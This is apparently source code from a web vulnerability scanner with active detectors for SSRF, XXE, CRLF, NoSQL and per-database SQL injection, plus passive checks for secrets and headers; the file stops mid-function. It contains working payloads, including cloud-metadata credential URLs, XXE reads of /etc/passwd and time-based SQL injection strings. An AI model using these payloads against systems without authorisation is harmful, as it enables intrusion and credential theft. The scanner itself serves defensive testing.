_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/", "http://localhost/",
]
_SSRF_MARKS = ("ami-id", "instance-id", "security-credentials", "computemetadata",
               "instance-identity", "iam/", "root:x:0:0")


def detect_ssrf(probe, baseline: Baseline | None = None, oob_token: str = "", oob_check=None) -> Result:
    base = (baseline.body_sample if baseline else "").lower()
    # The strongest path: OOB — if the caller provided a collaborator hook
    if oob_token and callable(oob_check):
        try:
            probe("http://%s/" % oob_token)
        except Exception:
            pass
        try:
            if oob_check(oob_token):
                return Result("ssrf", CONFIRMED, ["out-of-band callback received (blind SSRF)"],
                              payload="http://%s/" % oob_token, proof={"oob": oob_token})
        except Exception:
            pass
    # The content-returned path for internal content
    for pl in _SSRF_PAYLOADS:
        try:
            r = probe(pl)
        except Exception:
            continue
        if is_blocked(r):
            return Result("ssrf", BLOCKED, ["WAF/challenge response"])
        low = (r.body or "").lower()
        mk = next((m for m in _SSRF_MARKS if m in low and m not in base), None)
        if mk:
            return Result("ssrf", CONFIRMED, [f"internal/cloud-metadata content returned ({mk})"],
                          evidence=_excerpt(r.body, mk), payload=pl, proof={"marker": mk})
    return Result("ssrf", SAFE, ["no internal/metadata content"])


# ── NoSQL injection: boolean differential + DB error fingerprints ────────────
_NOSQL_ERRS = ("mongoerror", "mongoservererror", "bsonerror", "e11000", "couchdberror",
               "cast to objectid failed",
               "command failed with error", "redis error")
_NOSQL_BOOL = [
    ("' || '1'=='1", "' || '1'=='2"),
    ('" || "1"=="1', '" || "1"=="2'),
    ("'||'1'=='1'||'a'=='a", "'||'1'=='2'||'a'=='b"),
    (" || 1==1", " || 1==2"),
]


def detect_nosql(probe, baseline: Baseline | None = None, orig: str = "1") -> Result:
    signals, proof = [], {}
    # 1) error fingerprints from a broken NoSQL operator
    try:
        rq = probe((orig or "") + "'\"`{;$")
    except Exception:
        rq = Resp()
    if is_blocked(rq):
        return Result("nosql", BLOCKED, ["WAF/challenge response"])
    err = next((e for e in _NOSQL_ERRS if e in (rq.body or "").lower()), None)
    if err and rq.status >= 400:
        signals.append("nosql-error: " + err)
        proof["error"] = err
    elif err:
        # error keyword found in a normal 2xx/3xx page (e.g. "$regex" in JS code) → not a real error
        pass
    # 2) boolean differential (same FP guards as SQLi)
    hit, info = _bool_diff(probe, orig, _NOSQL_BOOL)
    if hit:
        signals.append(f"nosql boolean: TRUE~self({info['true_sim']:.2f}) vs FALSE differs({info['false_sim']:.2f})")
        proof["boolean"] = info
    if hit and err:
        return Result("nosql", CONFIRMED, signals, evidence=(rq.body or "")[:300],
                      payload=(orig or "") + "' || '1'=='1", proof=proof, severity="critical")
    if hit or err:
        return Result("nosql", PROBABLE, signals, evidence=(rq.body or "")[:300], proof=proof, severity="high")
    return Result("nosql", SAFE, ["no nosql signal"], proof=proof)


# ── CRLF / HTTP response-header injection ────────────────────────────────────
_CRLF_TMPLS = [
    "%0d%0a{h}:{m}", "%0d%0a%20{h}:{m}", "%0a{h}:{m}", "\r\n{h}:{m}",
    "%E5%98%8D%E5%98%8A{h}:{m}",            # unicode-overlong CRLF (WAF bypass)
    "%0d%0aSet-Cookie:{m}=1",
]


def detect_crlf(probe) -> Result:
    mk = _marker()
    hdr = "x-zq-crlf"
    for tmpl in _CRLF_TMPLS:
        pl = tmpl.format(h=hdr, m=mk)
        try:
            r = probe(pl)
        except Exception:
            continue
        if is_blocked(r):
            return Result("crlf", BLOCKED, ["WAF/challenge response"])
        hl = {str(k).lower(): str(v).lower() for k, v in (r.headers or {}).items()}
        injected = mk.lower() in hl.get(hdr, "") or mk.lower() in hl.get("set-cookie", "")
        if injected:
            return Result("crlf", CONFIRMED,
                          ["CRLF injection — attacker-controlled response header materialized"],
                          evidence=str(dict(r.headers or {}))[:300], payload=pl,
                          severity="high", proof={"header": hdr, "marker": mk})
    return Result("crlf", SAFE, ["no header injection"])


# ── XXE (in-band): external entity reading a local file ──────────────────────
_XXE_BODIES = [
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
]
_XXE_MARKS = ("root:x:0:0", "daemon:x:", "[extensions]", "[fonts]", "16-bit app support")


def detect_xxe(send, url, headers=None, cookies=None) -> Result:
    """Send an XML body with an external entity; if file content returns, XXE is confirmed.
    send(method, url, headers, cookies, body, follow) -> Resp."""
    for xml in _XXE_BODIES:
        h = dict(headers or {}); h["Content-Type"] = "application/xml"
        try:
            r = send("POST", url, h, cookies or {}, xml, True)
        except Exception:
            continue
        if is_blocked(r):
            return Result("xxe", BLOCKED, ["WAF/challenge response"])
        low = (r.body or "").lower()
        mk = next((m for m in _XXE_MARKS if m in low), None)
        if mk:
            return Result("xxe", CONFIRMED, [f"XXE — local file content returned ({mk})"],
                          evidence=_excerpt(r.body, mk if "root" in mk else "["), payload=xml,
                          severity="critical", proof={"marker": mk})
    return Result("xxe", SAFE, ["no entity expansion"])


# ── CORS (active): send a forged Origin and inspect the ACAO/ACAC reflection ──
def detect_cors_active(send, url, headers=None, cookies=None) -> Result:
    evil = "https://zq-evil.example"
    def _probe():
        h = dict(headers or {}); h["Origin"] = evil
        return send("GET", url, h, cookies or {}, "", False)
    try:
        r = _probe()
    except Exception:
        return Result("cors", SAFE, ["no response"])
    if is_blocked(r):
        return Result("cors", BLOCKED, ["WAF/challenge response"])
    hit = next((f for f in passive_scan(r, url=url, request_origin=evil)
                if f.vuln == "cors-misconfig"), None)
    if not hit:
        return Result("cors", SAFE, ["origin not reflected"])
    # Re-confirm: arbitrary-origin reflection is a deterministic server/CDN config, not a one-off.
    # A transient edge echo (the #1 CORS false positive, e.g. mtagm.agoda.com/g/collect) won't repeat.
    try:
        r2 = _probe()
    except Exception:
        r2 = Resp()
    acao2 = {str(k).lower(): str(v) for k, v in (r2.headers or {}).items()}.get("access-control-allow-origin", "")
    if acao2 != evil:
        return Result("cors", SAFE, ["origin reflection not reproducible (transient)"])
    # Impact gate: with an EMPTY response body there is no credentialed data to read cross-site, so
    # a write-only beacon (/collect, /v2, pixel) is at most low — never 'cross-site data theft'.
    if not (r.body or "").strip():
        return Result("cors", PROBABLE,
                      hit.signals + ["response body empty — no readable cross-origin data (low impact)"],
                      evidence=hit.evidence, payload="Origin: " + evil, severity="low", proof=hit.proof)
    return Result("cors", CONFIRMED, hit.signals, evidence=hit.evidence,
                  payload="Origin: " + evil, severity=hit.severity, proof=hit.proof)


# ── Host-header injection (cache/password-reset poisoning) ───────────────────
def detect_host_injection(send, url, headers=None, cookies=None) -> Result:
    mk = _marker() + ".zq-oob.example"
    for hdr in ("X-Forwarded-Host", "Host", "X-Host", "X-Forwarded-Server"):
        h = dict(headers or {}); h[hdr] = mk
        try:
            r = send("GET", url, h, cookies or {}, "", False)
        except Exception:
            continue
        if is_blocked(r):
            continue
        loc = (r.location or (r.headers or {}).get("Location", "")
               or (r.headers or {}).get("location", ""))
        if mk in (loc or ""):
            return Result("host-header", CONFIRMED,
                          [f"{hdr} reflected in redirect Location (web-cache/reset poisoning)"],
                          evidence="Location: " + loc[:200], payload=f"{hdr}: {mk}",
                          severity="medium", proof={"header": hdr})
        if mk in (r.body or ""):
            return Result("host-header", CONFIRMED,
                          [f"{hdr} reflected in response body (absolute URLs → poisoning)"],
                          evidence=_excerpt(r.body, mk), payload=f"{hdr}: {mk}",
                          severity="medium", proof={"header": hdr})
    return Result("host-header", SAFE, ["host header not reflected"])


# ═════════════════════════════════════════════════════════════════════════════
#  PASSIVE SCANNER — flags issues from a single response without sending payloads.
#  This is the big coverage layer Burp runs on every response: secrets, security
#  headers, cookie flags, CORS, info disclosure. Pure function over (Resp, url).
# ═════════════════════════════════════════════════════════════════════════════

# Strong, low-false-positive secret signatures (token shape is distinctive).
_SECRET_SIGS = [
    ("AWS access key id",      r"\bAKIA[0-9A-Z]{16}\b",                                   "high"),
    ("AWS secret access key",  r"(?i)aws_secret_access_key['\"\s:=]+[A-Za-z0-9/+]{40}\b", "critical"),
    ("Google API key",         r"\bAIza[0-9A-Za-z_\-]{35}\b",                             "high"),
    ("Google OAuth token",     r"\bya29\.[0-9A-Za-z_\-]{20,}",                            "high"),
    ("Slack token",            r"\bxox[baprs]-[0-9A-Za-z\-]{10,48}\b",                    "high"),
    ("GitHub token",           r"\bgh[pousr]_[0-9A-Za-z]{36,}\b",                         "critical"),
    ("Stripe live secret key", r"\bsk_live_[0-9A-Za-z]{24,}\b",                           "critical"),
    ("Stripe live publishable",r"\bpk_live_[0-9A-Za-z]{24,}\b",                           "low"),
    ("Twilio account SID",     r"\bAC[0-9a-f]{32}\b",                                     "medium"),
    ("SendGrid API key",       r"\bSG\.[0-9A-Za-z_\-]{22}\.[0-9A-Za-z_\-]{43}\b",         "critical"),
    ("Mailgun key",            r"\bkey-[0-9a-f]{32}\b",                                   "high"),
    ("Private key block",      r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "critical"),
    ("Generic secret assignment",
     r"(?i)(?:api[_-]?key|secret|client[_-]?secret|access[_-]?token|auth[_-]?token|passwd|password)"
     r"['\"]?\s*[:=]\s*['\"][^'\"\s]{12,}['\"]",                                          "medium"),
]
# Stack-trace / debug fingerprints (info disclosure).
_TRACE_SIGS = [
    ("PHP error",        r"(?i)(?:fatal error|parse error|warning):.*on line \d+|stack trace:"),
    ("Java stack trace", r"(?:exception in thread|\bat [a-z][\w.$]+\([\w.]+\.java:\d+\))"),
    ("Python traceback", r"Traceback \(most recent call last\):"),
    (".NET exception",   r"(?i)(?:system\.\w+exception|server error in '/' application)"),
    ("Ruby/Rails error", r"(?i)(?:nomethoderror|actioncontroller|activerecord::)"),
    ("SQL error leak",   r"(?i)(?:sql syntax|sqlstate\[|ora-\d{5}|pg::|psqlexception)"),
]
_VERSION_HDRS = ("server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
                 "x-generator", "x-drupal-cache", "x-runtime")
_PRIVATE_IP = re.compile(r"\b(?:10\.\d{1,3}|192\.168|172\.(?:1[6-9]|2\d|3[01])|127\.0\.0\.1)"
                         r"\.\d{1,3}(?:\.\d{1,3})?\b")


def _pf(vuln, severity, signal, url, evidence="", proof=None):
    return Result(vuln, CONFIRMED, [signal], evidence=(evidence or "")[:300],
                  proof=(proof or {}), severity=severity, url=url)


def passive_scan(resp: "Resp", url: str = "", request_origin: str = "") -> list:
    """Burp-style passive checks on one response. Returns a list of Result findings.
    request_origin: the Origin header we sent (to confirm a CORS reflection)."""
    out = []
    if resp is None:
        return out
    body = resp.body or ""
    hl = {str(k).lower(): str(v) for k, v in (resp.headers or {}).items()}
    ctype = hl.get("content-type", "").lower()
    is_html = "text/html" in ctype or (not ctype and "<html" in body[:500].lower())
    is_https = (url or resp.url or "").lower().startswith("https")

    # 1) Exposed secrets / keys in the body (and not obviously a placeholder)
    known_fp_secrets = (
        "wpparselysiteid", "parsely_site_uuid", "parsely-site-id",
        "google_analytics", "ga_id", "gtm-", "fbq(", "ga('create'",
        "stripe.publishable", "pk_live", "pk_test",
        "mapbox", "mapbox-gl", "recaptcha", "hcaptcha",
        "sentry_dsn", "datadog", "newrelic",
        "siteid", "site_id", "analyticsid", "trackingid",
    )
    seen_secret = set()
    for name, pat, sev in _SECRET_SIGS:
        for m in re.finditer(pat, body):
            tok = m.group(0)
            low = tok.lower()
            if any(p in low for p in ("example", "your-", "xxxx", "placeholder", "redacted",
                                      "0000000000", "1234567890", "test_", "dummy", "sample")):
                continue
            # Suppress known public analytics / CMS identifiers
            if any(fp in low for fp in known_fp_secrets):
                continue
            if tok in seen_secret:
                continue
            seen_secret.add(tok)
            out.append(_pf("secret-exposure", sev, f"{name} exposed in response body",
                           url, evidence=_excerpt(body, tok, 40), proof={"match": tok[:12] + "…"}))
            break  # one per signature type per response

    # 2) CORS misconfiguration (most impactful when it reflects our Origin + allows creds)
    acao = hl.get("access-control-allow-origin", "")
    acac = hl.get("access-control-allow-credentials", "").lower() == "true"
    if acao:
        ro = (request_origin or "").strip()
        if acao == "*" and acac:
            # Invalid combo, but NOT exploitable: browsers reject ACAO:* for credentialed
            # requests, and `*` is not the attacker's origin → no authenticated data leaks.
            out.append(_pf("cors-misconfig", "info",
                           "ACAO:* with Allow-Credentials:true — invalid combo, but browsers reject it "
                           "for credentialed requests (no credential leak; misconfiguration only)", url,
                           proof={"acao": acao}))
        elif ro and acao == ro and acac:
            out.append(_pf("cors-misconfig", "high",
                           f"CORS reflects arbitrary Origin ({ro}) with credentials → cross-site data theft",
                           url, proof={"acao": acao, "origin": ro}))
        elif acao.lower() == "null" and acac:
            out.append(_pf("cors-misconfig", "medium",
                           "ACAO:null with credentials (exploitable from sandboxed iframes)", url,
                           proof={"acao": acao}))
        elif acao == "*":
            out.append(_pf("cors-misconfig", "low",
                           "ACAO:* (wildcard) — public, but verify no sensitive data is served", url,
                           proof={"acao": acao}))

    # 3) Cookie flags (only meaningful for session-ish cookies)
    raw_cookies = resp.headers.get("Set-Cookie") if resp.headers else None
    setck = []
    if raw_cookies:
        setck = raw_cookies if isinstance(raw_cookies, list) else [raw_cookies]
    for sc in setck:
        scl = sc.lower()
        cname = sc.split("=", 1)[0].strip()
        looks_session = any(s in cname.lower() for s in
                            ("sess", "sid", "auth", "token", "jwt", "login", "remember"))
        flags = []
        if is_https and "secure" not in scl:
            flags.append("missing Secure")
        if "httponly" not in scl:
            flags.append("missing HttpOnly")
        if "samesite" not in scl:
            flags.append("missing SameSite")
        if flags and looks_session:
            out.append(_pf("cookie-flags", "low",
                           f"Session cookie '{cname}' — {', '.join(flags)}", url,
                           proof={"cookie": cname, "flags": flags}))

    # 4) Missing security headers (only on real HTML documents to avoid asset noise)
    if is_html and resp.status and resp.status < 400:
        miss = []
        if "content-security-policy" not in hl:
            miss.append("Content-Security-Policy")
        xfo = hl.get("x-frame-options", "").lower()
        csp = hl.get("content-security-policy", "").lower()
        if "frame-ancestors" not in csp and xfo not in ("deny", "sameorigin"):
            miss.append("X-Frame-Options/frame-ancestors (clickjacking)")
        if hl.get("x-content-type-options", "").lower() != "nosniff":
            miss.append("X-Content-Type-Options: nosniff")
        if is_https and "strict-transport-security" not in hl:
            miss.append("Strict-Transport-Security (HSTS)")
        if miss:
            out.append(_pf("security-headers", "info",
                           "Missing security headers: " + ", ".join(miss), url,
                           proof={"missing": miss}))

    # 5) Software/version disclosure
    vers = []
    for h in _VERSION_HDRS:
        v = hl.get(h, "")
        if v and re.search(r"\d", v):
            vers.append(f"{h}: {v}")
    if vers:
        out.append(_pf("info-disclosure", "info", "Version/tech disclosed via headers: "
                       + "; ".join(vers[:4]), url, proof={"headers": vers[:6]}))

    # 6) Stack traces / framework errors in the body
    for name, pat in _TRACE_SIGS:
        m = re.search(pat, body)
        if m:
            out.append(_pf("info-disclosure", "low", f"{name} leaked in response (debug/info disclosure)",
                           url, evidence=_excerpt(body, m.group(0)[:40]), proof={"kind": name}))
            break

    # 7) Directory listing
    if is_html and re.search(r"<title>\s*Index of /|<h1>\s*Index of /", body, re.I):
        out.append(_pf("info-disclosure", "low", "Directory listing enabled (Index of /)", url))

    # 8) Private/internal IP leak in the body
    mip = _PRIVATE_IP.search(body)
    if mip:
        out.append(_pf("info-disclosure", "info", f"Internal IP address leaked ({mip.group(0)})",
                       url, evidence=_excerpt(body, mip.group(0), 30)))

    return out


# ── Dispatcher: pick the detector and return the result ──────────────────────
_DISPATCH = {
    "xss": lambda probe, base, orig, **k: detect_xss(probe, base),
    "sqli": lambda probe, base, orig, **k: detect_sqli(probe, base, orig, timing=k.get("timing", True)),
    "ssti": lambda probe, base, orig, **k: detect_ssti(probe, base),
    "lfi": lambda probe, base, orig, **k: detect_lfi(probe, base),
    "cmdi": lambda probe, base, orig, **k: detect_cmdi(probe, base, timing=k.get("timing", True)),
    "open_redirect": lambda probe, base, orig, **k: detect_open_redirect(probe, k.get("target_netloc", "")),
    "ssrf": lambda probe, base, orig, **k: detect_ssrf(probe, base, k.get("oob_token", ""), k.get("oob_check")),
    "nosql": lambda probe, base, orig, **k: detect_nosql(probe, base, orig),
    "crlf": lambda probe, base, orig, **k: detect_crlf(probe),
}


def scan(vuln: str, probe, orig: str = "1", calibrate_samples: int = 3, **kw) -> Result:
    """Unified entry point: calibrate the site, then run the adaptive detector for the requested type."""
    vuln = (vuln or "xss").lower().strip()
    base = calibrate(probe, samples=calibrate_samples)
    fn = _DISPATCH.get(vuln)
    if not fn:
        return Result(vuln, SAFE, [f"unsupported vuln type: {vuln}"])
    res = fn(probe, base, orig, **kw)
    res.proof["baseline"] = {"status": base.status, "length": base.length,
                             "time_med": round(base.time_med, 3), "reflects": base.reflects}
    return res


# ═════════════════════════════════════════════════════════════════════════════
#  Scan every injection point (Burp-style): URL params + HTTP headers + cookies + POST body + JSON
# ═════════════════════════════════════════════════════════════════════════════
import json as _json
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse, quote

# High-value headers for injection (the ones Burp usually injects into)
_INJECT_HEADERS = ("User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
                   "X-Real-IP", "X-Forwarded-Proto", "X-Host", "X-Originating-IP",
                   "CF-Connecting-IP", "True-Client-IP", "Origin", "X-Api-Version")
# Headers that carry IP addresses or protocol values — backends never run these through SQL/templates.
# SQLi/CMDi/SSTI/LFI on these headers is almost always a timing false positive.
_HEADER_SKIP_FOR = {
    "sqli":  frozenset({"X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
                        "X-Forwarded-Proto", "X-Originating-IP", "X-Api-Version",
                        "X-Host", "Content-Type"}),
    "cmdi":  frozenset({"X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
                        "X-Forwarded-Proto", "X-Originating-IP", "X-Api-Version",
                        "X-Host", "Content-Type"}),
    "ssti":  frozenset({"X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
                        "X-Forwarded-Proto", "X-Originating-IP", "X-Api-Version",
                        "X-Host", "Content-Type"}),
    "lfi":   frozenset({"X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
                        "X-Forwarded-Proto", "X-Originating-IP", "X-Api-Version",
                        "X-Host", "Content-Type"}),
}


@dataclass
class Point:
    place: str          # query | header | cookie | form | json | path
    name: str
    orig: str = ""
    synthetic: bool = False   # an added test param (reflected-XSS probe), not a real one


def _set_query(url: str, name: str, value: str) -> str:
    pr = urlparse(url)
    qs = dict(parse_qsl(pr.query, keep_blank_values=True))
    qs[name] = value
    return urlunparse(pr._replace(query=urlencode(qs)))


def _json_leaves(body: str):
    try:
        obj = _json.loads(body)
    except Exception:
        return []
    out = []

    def walk(o, path):
        if isinstance(o, dict):
            for k, v in o.items():
                walk(v, path + [str(k)])
        elif isinstance(o, list):
            for i, v in enumerate(o):
                walk(v, path + [str(i)])
        else:
            out.append(".".join(path))
    walk(obj, [])
    return out


def _json_set(body: str, path: str, value):
    obj = _json.loads(body)
    keys = path.split(".")
    cur = obj
    for k in keys[:-1]:
        cur = cur[int(k)] if isinstance(cur, list) else cur[k]
    last = keys[-1]
    if isinstance(cur, list):
        cur[int(last)] = value
    else:
        cur[last] = value
    return _json.dumps(obj)


# Types injectable at any point
_POINT_TYPES = ("xss", "sqli", "ssti", "lfi", "cmdi", "nosql", "crlf")
_ID_SEG = re.compile(r"^(?:\d+|[0-9a-fA-F]{8,}|[0-9a-fA-F]{8}-[0-9a-fA-F-]{27})$")


def enumerate_points(method="GET", url="", headers=None, cookies=None,
                     body="", content_type="") -> list:
    """Enumerate every injection point in the request (Burp-style)."""
    pts = []
    for k, v in parse_qsl(urlparse(url).query, keep_blank_values=True):
        pts.append(Point("query", k, v))
    # Synthetic reflected-XSS probe: many apps reflect ANY query param (e.g. into a JS
    # "queryString" object). A page crawled WITHOUT params would otherwise never be tested,
    # so we add one extra param and check it for reflected XSS only (Burp-style).
    pts.append(Point("query", "zqxr1", "1", synthetic=True))
    # Synthetic param-NAME probe (Burp: "the name of an arbitrarily supplied URL parameter").
    # Some apps echo every query-string KEY back (e.g. into a JS "queryString" object) — there the
    # payload lands in the parameter NAME, not its value. We add one param whose NAME carries the
    # probe value and test it for reflected XSS only.
    pts.append(Point("query_name", "zqxn1", "1", synthetic=True))
    # RESTful path parameters: /user/123 → fuzz the "123" segment (IDOR/SQLi/path traversal)
    _segs = urlparse(url).path.split("/")
    for _i, _seg in enumerate(_segs):
        if _seg and _ID_SEG.match(_seg):
            pts.append(Point("path", str(_i), _seg))
    hdr_names = list(dict.fromkeys(list(_INJECT_HEADERS) + list((headers or {}).keys())))
    for h in hdr_names:
        pts.append(Point("header", h, (headers or {}).get(h, "")))
    for k, v in (cookies or {}).items():
        pts.append(Point("cookie", k, v))
    ct = (content_type or "").lower()
    bs = (body or "").strip()
    if bs:
        if "json" in ct or bs[:1] in ("{", "["):
            for leaf in _json_leaves(body):
                pts.append(Point("json", leaf))
        else:
            for k, v in parse_qsl(body, keep_blank_values=True):
                pts.append(Point("form", k, v))
    return pts


def inject(method, url, headers, cookies, body, content_type, point: Point, value):
    """Place the value at the given injection point and return the modified request parts."""
    headers = dict(headers or {})
    cookies = dict(cookies or {})
    if point.place == "query":
        url = _set_query(url, point.name, value)
    elif point.place == "query_name":
        # The injected value becomes a query-string KEY (param name); the value stays benign.
        pr = urlparse(url)
        qs = parse_qsl(pr.query, keep_blank_values=True)
        qs.append((value, point.orig or "1"))
        url = urlunparse(pr._replace(query=urlencode(qs)))
    elif point.place == "header":
        headers[point.name] = value
    elif point.place == "cookie":
        cookies[point.name] = value
    elif point.place == "form":
        qs = dict(parse_qsl(body or "", keep_blank_values=True))
        qs[point.name] = value
        body = urlencode(qs)
    elif point.place == "json":
        try:
            body = _json_set(body, point.name, value)
        except Exception:
            pass
    elif point.place == "path":
        pr = urlparse(url)
        segs = pr.path.split("/")
        try:
            idx = int(point.name)
            if 0 <= idx < len(segs):
                segs[idx] = quote(str(value), safe="")
                url = urlunparse(pr._replace(path="/".join(segs)))
        except Exception:
            pass
    return method, url, headers, cookies, body


def make_probe(send, method, url, headers, cookies, body, content_type, point: Point, follow=True):
    """Build probe(value) that injects into a single point and sends via the injected `send`."""
    def probe(value):
        m, u, h, c, b = inject(method, url, headers, cookies, body, content_type, point, value)
        return send(m, u, h, c, b, follow)
    return probe


def scan_all_points(send, method="GET", url="", headers=None, cookies=None,
                    body="", content_type="", allowed_types=None,
                    timing=False, max_points=40):
    """Scan every injection point x every allowed type — one shared calibration (to save requests).

    send(method, url, headers, cookies, body, follow) -> Resp  (injected by the caller).
    Returns a list of (Point, vuln_type, Result) for confirmed/probable results only.
    """
    types = [t for t in (allowed_types or _POINT_TYPES) if t in _POINT_TYPES]
    if not types:
        return []
    points = enumerate_points(method, url, headers, cookies, body, content_type)[:max_points]
    if not points:
        return []
    # One calibration: a benign value in a synthetic parameter -> the page's normal behavior
    def _neutral(v):
        return send(method, _set_query(url, "zqcb", v), headers, cookies, body, True)
    base = calibrate(_neutral, samples=5)

    # Each detector receives the point's REAL original value as `orig` (not a hardcoded "1")
    # so the boolean differential anchors on the actual response — far more accurate.
    det = {
        "xss":   lambda p, o: detect_xss(p, base),
        "sqli":  lambda p, o: detect_sqli(p, base, o or "1", timing=timing),
        "ssti":  lambda p, o: detect_ssti(p, base),
        "lfi":   lambda p, o: detect_lfi(p, base),
        "cmdi":  lambda p, o: detect_cmdi(p, base, timing=timing),
        "nosql": lambda p, o: detect_nosql(p, base, o or "1"),
        "crlf":  lambda p, o: detect_crlf(p),
    }
    results = []
    for pt in points:
        probe = make_probe(send, method, url, headers, cookies, body, content_type, pt, True)
        _orig = pt.orig or "1"
        # A synthetic (added) param only makes sense for reflected XSS — running SQLi/SSTI/etc.
        # on a parameter the app never had would be wasted requests.
        _pt_types = [t for t in (["xss"] if getattr(pt, "synthetic", False) else types) if t in types]
        for vt in _pt_types:
            if vt not in det:
                continue
            # Skip vuln types that produce false positives on IP/protocol headers
            if pt.place == "header" and pt.name in _HEADER_SKIP_FOR.get(vt, frozenset()):
                continue
            try:
                res = det[vt](probe, _orig)
            except Exception:
                continue
            if res.confidence in (CONFIRMED, PROBABLE):
                res.proof["point"] = {"place": pt.place, "name": pt.name}
                results.append((pt, vt, res))
    return results


# ═════════════════════════════════════════════════════════════════════════════
#  Per-DBMS SQLi: enhanced time/error/union payloads for MySQL, PG, MSSQL, Oracle, SQLite
# ═════════════════════════════════════════════════════════════════════════════
_DBMS_ERRORS = {
    "mysql": ("you have an error in your sql syntax", "warning: mysql",
              "mysql_fetch", "mysql server version", "com.mysql.jdbc",
              "mysqli_", "valid mysql result", "mysql_num"),
    "postgresql": ("pg_query()", "postgresql error", "org.postgresql.util.psqlexception",
                   "psqlexception", "warning: pg_", "pg_fetch", "pg_last_error"),
    "mssql": ("incorrect syntax near", "unclosed quotation mark",
              "microsoft jet database", "odbc microsoft access",
              "[microsoft][odbc sql server driver]", "sqlstate",
              "conversion failed when converting", "data type mismatch",
              "column count doesn't match"),
    "oracle": ("ora-0", "ora-00933", "ora-01756", "ora-00921", "ora-00936",
               "sqlite_error", "quoted string not properly terminated",
               "unterminated quoted string"),
    "sqlite": ("sqlite_error", "sqlite3.operationalerror", "not an error"),
}
_DBMS_UNION = {
    "mysql": ["%s' UNION SELECT %s-- -", "%s' UNION SELECT %s,%s-- -",
              "%s' UNION SELECT %s,%s,%s-- -", "%s UNION SELECT %s-- -",
              "%s')) UNION SELECT %s,%s-- -", "%s\" UNION SELECT %s,%s-- -"],
    "postgresql": ["%s' UNION SELECT %s-- -", "%s' UNION SELECT %s,%s-- -",
                   "%s' UNION SELECT %s::text,%s::text-- -"],
    "mssql": ["%s' UNION SELECT %s-- -", "%s' UNION SELECT %s,%s-- -",
              "%s' UNION SELECT %s,%s,%s-- -"],
    "oracle": ["%s' UNION SELECT %s FROM dual-- -",
               "%s' UNION SELECT %s,%s FROM dual-- -"],
    "sqlite": ["%s' UNION SELECT %s-- -", "%s' UNION SELECT %s,%s-- -"],
}


def _dbms_time_payloads(orig: str) -> list[tuple[str, str, str]]:
    """Yield (dbms, label, payload) for each DBMS time-based probe."""
    _base = orig or "1"
    d = []
    # MySQL
    for t in ("' AND SLEEP(6)-- -", "' AND SLEEP(6)#", "'/**/AND/**/SLEEP(6)-- -",
              "') AND SLEEP(6)-- -", '" AND SLEEP(6)-- -', " AND SLEEP(6)"):
        d.append(("mysql", "MySQL SLEEP(6)", _base + t))
    # PostgreSQL
    for t in ("' AND pg_sleep(6)-- -", "' || pg_sleep(6)-- -", "' AND pg_sleep(6)::int-- -"):
        d.append(("postgresql", "PostgreSQL pg_sleep(6)", _base + t))
    # MSSQL
    for t in ("' WAITFOR DELAY '0:0:6'-- -", '"; WAITFOR DELAY \'0:0:6\'-- -',
              "' WAITFOR DELAY '0:0:6'--"):
        d.append(("mssql", "MSSQL WAITFOR DELAY", _base + t))
    # Oracle
    for t in ("' AND dbms_pipe.receive_message(('a'),6)-- -",
              "' AND dbms_pipe.receive_message(('a'),6)||'", "' AND 1=dbms_pipe.receive_message(('a'),6)-- -"):
        d.append(("oracle", "Oracle dbms_pipe.receive_message", _base + t))
    # SQLite (no sleep — use heavy computation)
    for t in ("' AND randomblob(50000000)-- -", "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))-- -"):
        d.append(("sqlite", "SQLite heavy blob", _base + t))
    return d


def _dbms_errors(body: str) -> tuple[str | None, str | None]:
    """Return (dbms, error_message) if the body matches any known DBMS error."""
    for dbms, sigs in _DBMS_ERRORS.items():
        for s in sigs:
            if s in (body or "").lower():
                return dbms, s
    return None, None


def _dbms_union_templates(orig: str, marker: str) -> list[tuple[str, str]]:
    """Yield (dbms, payload) for each DBMS UNION SELECT template."""
    _base = orig or "1"
    d = []
    for dbms, tmpls in _DBMS_UNION.items():
        for t in tmpls:
            n = t.count("%s") - 1
            try:
                pl = t % ((_base,) + (marker,) * n)
            except Exception:
                continue
            d.append((dbms, pl))
    return d


def detect_sqli_dbms(probe, baseline: Baseline | None = None, orig: str = "1") -> Result:
    """Per-DBMS blind SQLi detection: tries MySQL/PG/MSSQL/Oracle/SQLite time payloads
    and UNION markers with DBMS-typed templates.  Returns CONFIRMED only when a time delay
    of >= 5 s is observed for at least ONE DBMS-specific payload."""
    bline = baseline or Baseline()
    thr = max(5.0, bline.time_med + 4.0 * max(1.0, (bline.time_mad or 0.5) / max(0.1, bline.time_med)))

    for dbms, label, pl in _dbms_time_payloads(orig):
        try:
            r1 = probe(pl)
        except Exception:
            continue
        if is_blocked(r1):
            continue
        if r1.elapsed >= thr:
            # Re-confirm with a second request to rule out jitter
            try:
                r2 = probe(pl)
            except Exception:
                continue
            if is_blocked(r2):
                continue
            if r2.elapsed >= thr and abs(r1.elapsed - r2.elapsed) / max(r1.elapsed, r2.elapsed) <= 0.30:
                signals = [f"{label} → {r1.elapsed:.1f}s & {r2.elapsed:.1f}s (base {bline.time_med:.1f}s)"]
                return Result("sqli", CONFIRMED, signals, payload=pl,
                              severity="critical", proof={"dbms": dbms, "elapsed": round(r1.elapsed, 2), "elapsed2": round(r2.elapsed, 2), "payload": pl})
    # Also try UNION markers with DBMS-aware templates
    marker = _marker()
    # First check UNION doesn't reflect as plain value (same as detect_sqli)
    try:
        rc = probe((orig or "1") + marker)
        reflective = (not is_blocked(rc)) and (marker in (rc.body or ""))
    except Exception:
        reflective = False
    if not reflective:
        for dbms, pl in _dbms_union_templates(orig, marker):
            try:
                ru = probe(pl)
